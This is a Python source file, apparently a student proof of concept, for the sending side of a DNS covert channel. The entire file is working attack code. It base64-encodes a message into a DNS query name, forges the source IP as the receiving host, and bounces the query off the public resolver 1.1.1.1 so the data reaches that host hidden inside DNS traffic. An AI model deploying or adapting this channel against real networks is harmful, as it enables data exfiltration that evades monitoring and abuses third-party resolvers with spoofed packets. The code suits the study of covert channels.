"""
sender.py
Connor Jackson
"""

from scapy.all import DNS, DNSQR, IP, send, UDP
import base64

# TODO: Identify packet as from CC server. This is so the reciever can filter which DNS queries to analize. (I know marking the packet in a unique way is an easy way to defeat the channel, but this is just a PoC)

# Destination of covert message
DEST = "192.168.10.1"

# Legit DNS server to bounce off of
DNS_SERVER = "1.1.1.1"

# Message (static for testing purposes)
DATA = "The jar is under the bed"


# Create DNS packet
def craftPacket():

    # Encode message in base64 (obfuscation)
    message = str(base64.b64encode(DATA.encode("utf-8"))) 
    
    # Craft DNS query. Packet will be bounced off legit DNS server to target machine. Message is appended to query name
    dnsReq = IP(src = DEST, dst= DNS_SERVER)/ \
        UDP(dport = 53)/ \
            DNS(rd = 1, \
                qd = DNSQR(qname = message) \
            )
    print(dnsReq.mysummary())
    return dnsReq

# Main
def main():

    try:
        # Create packet
        packet = craftPacket()

        # Send packet
        send(packet, verbose=1)

        print("Data sent!")

    except:
        print("something went wrong!")


if __name__ == "__main__":
    main()
